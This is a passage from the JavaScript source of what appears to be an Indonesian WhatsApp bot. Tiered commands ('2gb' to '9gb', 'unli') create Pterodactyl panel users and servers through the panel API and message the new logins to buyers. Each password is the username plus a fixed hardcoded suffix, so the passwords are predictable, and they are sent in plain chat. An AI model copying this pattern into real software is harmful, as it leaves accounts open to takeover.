"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY ϝαԃȥʋρɳ ⚡ PANEL

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs ϝαԃȥʋρɳ`)
}

break
case "2gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "60"
let disk = "2048"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "xibj2dgv8"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "80"
let disk = "3072"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "xibj2dgv8"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "100"
let disk = "4000"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "xibj2dgv8"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "xibj2dgv8"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "120"
let disk = "5138"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "6GB"
let egg = global.eggsnya
let loc = global.location
let memo = "6144"
let cpu = "150"
let disk = "6144"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "7GB"
let egg = global.eggsnya
let loc = global.location
let memo = "7168"
let cpu = "170"
let disk = "7168"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "8GB"
let egg = global.eggsnya
let loc = global.location
let memo = "8192"
let cpu = "200"
let disk = "8192"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "9GB"
let egg = global.eggsnya
let loc = global.location
let memo = "9216"
let cpu = "220"
let disk = "9216"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
